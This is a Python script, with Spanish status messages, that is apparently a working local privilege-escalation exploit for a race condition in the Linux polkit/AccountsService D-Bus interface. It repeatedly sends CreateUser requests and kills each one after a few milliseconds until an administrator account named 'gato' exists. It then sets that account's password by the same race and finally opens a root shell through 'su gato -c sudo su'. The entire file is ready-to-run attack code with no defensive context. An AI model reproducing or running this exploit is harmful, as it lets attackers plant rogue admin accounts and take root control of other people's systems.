import os
import sys
import time
import subprocess
import random
import pwd

print(" [+] Iniciando el exploit ")
time.sleep(3)

check = True
counter = 0
while check:
	counter = counter +1
	process = subprocess.Popen(['dbus-send','--system','--dest=org.freedesktop.Accounts','--type=method_call','--print-reply','/org/freedesktop/Accounts','org.freedesktop.Accounts.CreateUser','string:gato','string:"Gato Gamer','int32:1'])
	try:
		Random = random.uniform(0.006,0.009)
		process.wait(timeout=Random)
		process.kill()
	except subprocess.TimeoutExpired:
    		process.kill()
	
	user = subprocess.run(['id', 'gato'], stdout=subprocess.PIPE).stdout.decode('utf-8')
	if user.find("uid") != -1:
		print(" [+] Usuario creado con el nombre de gato ")
		print(" [+] Continuando con el exploit "+str(Random))
		check =False
		break
	if counter > 2000:
		print(" [-] No se pudo agregar el usuario, int√©ntalo de nuevo, puede funcionar ")
		sys.exit(0)

for i in range(200):
	uid = "/org/freedesktop/Accounts/User"+str(pwd.getpwnam('gato').pw_uid)

	password = "string:"

	process = subprocess.Popen(['dbus-send','--system','--dest=org.freedesktop.Accounts','--type=method_call','--print-reply',uid,'org.freedesktop.Accounts.User.SetPassword',password,'string:GoldenEye'])
	try:
    		Random = random.uniform(0.006,0.009)
    		process.wait(timeout=Random)
    		process.kill()
	except subprocess.TimeoutExpired:
    		process.kill()

print(" [+] Continuando con el exploit " + str(Random))
print(" [+] Exploit completado ")

p = subprocess.call("(su gato -c 'sudo su')", shell=True)
